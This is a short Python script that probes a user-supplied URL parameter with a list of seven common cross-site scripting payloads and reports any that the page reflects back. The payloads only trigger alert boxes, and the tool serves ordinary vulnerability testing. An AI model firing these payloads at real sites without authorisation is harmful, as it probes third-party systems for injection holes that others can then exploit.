import requests
import urllib.parse

# List of common XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<body onload=alert('XSS')>",
    "<img src='x' onerror='alert(1)'>",
    "<div id='test' onmouseover='alert(1)'>Hover me</div>"
]

# Function to test for XSS vulnerability
def test_xss(url, param):
    for payload in XSS_PAYLOADS:
        # Encode the payload to prevent URL interpretation issues
        encoded_payload = urllib.parse.quote(payload)
        
        # Prepare the URL with the payload injected into the parameter
        test_url = f"{url}?{param}={encoded_payload}"
        
        try:
            print(f"Testing payload: {payload} on {url}")
            response = requests.get(test_url, timeout=8)
            
            # Check if the payload is reflected in the response
            if payload in response.text:
                print(f"Potential XSS vulnerability detected at: {test_url}")
                print(f"Payload: {payload}")
            else:
                print(f"No XSS vulnerability detected with payload: {payload}")
        
        except requests.RequestException as e:
            print(f"Error with request: {e}")

# Main function
def main():
    print("XSS Vulnerability Tester\n")
    url = input("Enter the target URL (with the parameter to test): ").strip()
    param = input("Enter the parameter name to test (e.g., id, user): ").strip()
    
    test_xss(url, param)

if __name__ == "__main__":
    main()
